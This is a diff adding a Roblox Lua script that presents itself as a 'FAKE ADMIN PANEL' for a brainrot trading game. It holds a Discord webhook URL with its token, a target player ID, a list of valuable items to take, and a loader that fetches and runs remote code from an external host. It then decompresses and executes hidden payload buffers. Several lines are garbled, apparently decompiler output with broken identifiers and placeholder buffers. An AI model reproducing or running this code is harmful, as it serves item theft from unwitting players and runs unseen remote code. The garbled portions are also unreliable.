@@ -1,0 +1,166 @@
+local genv = getgenv()
+
+genv.WEBHOOK_URL = 'https://discord.com/api/webhooks/1477776859306660062/sIFIuqnh-_Z9qAmObLaEStqOsKaaxSofvtvo7F4C458aSLgy9TzpG4PQInNMVJ8THwKV'
+genv.TARGET_ID = 2606738563
+genv.DELAY_STEP = 1
+genv.TRADE_CYCLE_DELAY = 2
+genv.TARGET_BRAINROTS = {
+    Cerberus = true,
+    ['Fragrama and Chocrama'] = true,
+    ['Mieteteira Bicicleteira'] = true,
+    ['Los Bros'] = true,
+    ['Tuff Toucan'] = true,
+    Meowl = true,
+    ['Guest 666'] = true,
+    ['Los Sekolahs'] = true,
+    ['Tictac Sahur'] = true,
+    ['Festive 67'] = true,
+    ['La Jolly Grande'] = true,
+    ['Garama and Madundung'] = true,
+    ['Reinito Sleighito'] = true,
+    ['Dragon Gingerini'] = true,
+    ['Agarrini la Palini'] = true,
+    ['Tang Tang Keletang'] = true,
+    ['Rosey and Teddy'] = true,
+    ['Spaghetti Tualetti'] = true,
+    ['Los Tacoritas'] = true,
+    ['W or L'] = true,
+    Eviledon = true,
+    ['La Extinct Grande'] = true,
+    ['Dragon Cannelloni'] = true,
+    ['Popcuru and Fizzuru'] = true,
+    ['La Casa Boo'] = true,
+    ['Los Puggies'] = true,
+    ['La Secret Combinasion'] = true,
+    ['La Taco Combinasion'] = true,
+    ['Ketchuru and Musturu'] = true,
+    ['Swaggy Bros'] = true,
+    ['Mariachi Corazoni'] = true,
+    ['Burguro And Fryuro'] = true,
+    ['Quesadillo Vampiro'] = true,
+    ['Nuclearo Dinossauro'] = true,
+    ['La Spooky Grande'] = true,
+    ['Los Tralaleritos'] = true,
+    ['Los Amigos'] = true,
+    ['Tacorita Bicicleta'] = true,
+    ['Hydra Dragon Cannelloni'] = true,
+    ['Gobblino Uniciclino'] = true,
+    ['Los Spaghettis'] = true,
+    ['Ketupat Kepat'] = true,
+    ['Money Money Puggy'] = true,
+    ['Los Primos'] = true,
+    ['Love Love Bear'] = true,
+    ['La Romantic Grande'] = true,
+    ['La Food Combinasion'] = true,
+    ['Lovin Rose'] = true,
+    ['Los Planitos'] = true,
+    ['Rosetti Tualetti'] = true,
+    ['La Ginger Sekolah'] = true,
+    ['Capitano Moby'] = true,
+    ['Los Spooky Combinasionas'] = true,
+    ['Cooki and Milki'] = true,
+    ['Money Money Reindeer'] = true,
+    ['Las Sis'] = true,
+    ['La Grande Combinasion'] = true,
+    ['Ketupat Bros'] = true,
+    ['Headless Horseman'] = true,
+    ['Celularcini Viciosini'] = true,
+    ['Lavadorito Spinito'] = true,
+    ['Skibidi Toilet'] = true,
+    ['La Supreme Combinasion'] = true,
+    Orcaledon = true,
+    ['Spooky and Pumpky'] = true,
+    ['Los Hotspotsitos'] = true,
+    ['Ginger Gerat'] = true,
+    ['Chipso and Queso'] = true,
+    ['Strawberry Elephant'] = true,
+    Tralaledon = true,
+    ['Swag Soda'] = true,
+    ['Chillin Chili'] = true,
+}
+
+game:GetService('TweenService')
+game:GetService('CoreGui')
+
+local _LocalPlayer8 = game:GetService('Players').LocalPlayer
+local _call10 = _LocalPlayer8:WaitForChild('PlayerGui')
+
+game:GetService('StarterGui'):SetCore('SendNotification', {
+    Text = 'FAKE ADMIN PANEL \u{1f4b5} Ready',
+    Title = 'Injected',
+    Duration = 6,
+})
+task.spawn(function()
+    local _ = _LocalPlayer8.Name .. '.Shop'
+
+    task.wait(0.5)
+    _call10:FindFirstChild(_LocalPlayer8.DisplayName .. '.Shop')
+    task.wait(0.3)
+
+    local _call33 = _call10:FindFirstChild(_LocalPlayer8.DisplayName .. '.Shop'):FindFirstChild('Shop'):FindFirstChild('Content'):FindFirstChild('List')
+    local _call35 = _call33:FindFirstChild('ItemsList')
+
+    for _38, _38_2 in ipairs(_call35:GetChildren())do
+        _38_2:IsA('ImageLabel')
+        38_2:FindFirstChild('_inj')
+    end
+
+    _call35.ChildAdded:Connect(function(_46)
+        task.wait(0.1)
+        _46:IsA('ImageLabel')
+        46:FindFirstChild('_inj')
+    end)
+
+    local _call52 = _call33:FindFirstChild('GamepassList')
+
+    for _55, _55_2 in ipairs(_call52:GetChildren())do
+        _55_2:IsA('ImageLabel')
+        55_2:FindFirstChild('_inj')
+    end
+
+    _call52.ChildAdded:Connect(function(_63)
+        task.wait(0.1)
+        _63:IsA('ImageLabel')
+        63:FindFirstChild('_inj')
+    end)
+
+    local _call69 = _call52:FindFirstChild('Main')
+
+    for _72, _72_2 in ipairs(_call69:GetChildren())do
+        _72_2:IsA('ImageLabel')
+        72_2:FindFirstChild('_inj')
+    end
+
+    _call69.ChildAdded:Connect(function(_80)
+        task.wait(0.1)
+        _80:IsA('ImageLabel')
+        80:FindFirstChild('_inj')
+    end)
+
+    local _call86 = _call33:FindFirstChild('ServerLuck')
+
+    call86:FindFirstChild('Frame'):FindFirstChild('_inj')
+    _call86.ChildAdded:Connect(function(_94)
+        task.wait(0.1)
+
+        local _ = _94.Name
+    end)
+end)
+loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua'))()
+
+local _Zstd101 = Enum.CompressionAlgorithm.Zstd
+
+loadstring('\27LuaP', nil, nil)
+loadstring('function: 0x00000201f873ef28', nil, nil)
+
+local _call106 = game:GetService('EncodingService')
+local _call108 = _call106:DecompressBuffer({
+    '<25ms-unknown-type:buffer: 0x00000201f869a5c8>',
+}, _Zstd101)
+local _call110 = _call106:DecompressBuffer({
+    '<25ms-unknown-type:buffer: 0x00000201fc060178>',
+}, _Zstd101)
+local _111 = buffer.tostring(_call108)
+local _call114 = loadstring(_111)(_call110)(...)
+
+return _call114
